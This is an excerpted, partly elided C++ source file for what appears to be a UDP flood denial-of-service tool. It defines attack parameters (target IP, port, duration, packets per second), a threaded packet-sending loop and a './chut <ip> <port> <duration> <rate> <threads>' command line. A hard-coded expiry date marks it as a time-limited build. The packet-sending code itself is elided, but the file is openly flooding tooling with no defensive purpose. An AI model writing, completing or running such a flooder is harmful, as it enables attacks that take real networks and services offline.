...
#define EXPIRY_DATE "2026-2-28"   

struct AttackParams {
    std::string ip;
    int port;
    int duration;
    int rate; // Rate (packets per second)
};
...
void* send_udp_packets(void* arg) {
    ...
    // Rate-limiting logic
    int packets_per_second = params->rate; // Rate specified by the user
    int delay_in_microseconds = 1000000 / packets_per_second; // Delay to maintain rate
    ...
    while (time(nullptr) - start_time < params->duration) {
        ...
        usleep(delay_in_microseconds); // Wait before sending the next packet to maintain rate
    }
...
int main(int argc, char *argv[]) {
    ...
    if (strcmp(argv[0], "./chut") != 0) {
        std::cerr << "Error: use ./chut <ip> <port> <duration> <rate> <threads>\n";
        return 1;
    }
    ...
    int default_rate = 100; // Default rate is 100 packets per second
    ...
    params.rate = (argc >= 5) ? std::stoi(argv[4]) : default_rate;
    int thread_count = (argc >= 6) ? std::stoi(argv[5]) : default_threads;
    ...
    std::cout << "Using values: IP = " << params.ip << ", Port = " << params.port 
              << ", Duration = " << params.duration << " seconds, Rate = " << params.rate 
              << " packets per second, Threads = " << thread_count << std::endl;
